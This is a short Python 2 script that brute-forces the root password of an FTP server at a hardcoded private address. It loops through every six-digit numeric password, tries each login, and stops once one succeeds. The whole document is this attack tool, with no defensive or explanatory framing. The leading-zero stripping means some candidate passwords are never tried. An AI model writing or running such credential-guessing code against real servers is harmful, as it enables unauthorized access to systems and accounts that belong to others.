from ftplib import FTP
import re,os
def dict(ip):
	l=[]
	for a in range(0,10):
		for b in range(0,10):
			for c in range(0,10):
				for d in range(0,10):
					for e in range(0,10):
						for f in range(0,10):
							l=[a,b,c,d,e,f]
							l=str(l)
							passwd = re.sub(r'\D','',l)
							passwd = re.sub(r'^0*','',passwd)
							vsftp(ip,passwd)
def vsftp(ip,passwd):
	ftp=FTP()
	try:
		ftp.connect(ip,21,0.01)	
		ftp.login('root',passwd)
		print ip,'connect ok and','password:'+str(passwd),'ok'
		ftp.quit()
		os._exit(0)
	except:
		print ip,'connect down or',passwd,'error'
if __name__ == '__main__':
	dict('192.168.1.130')
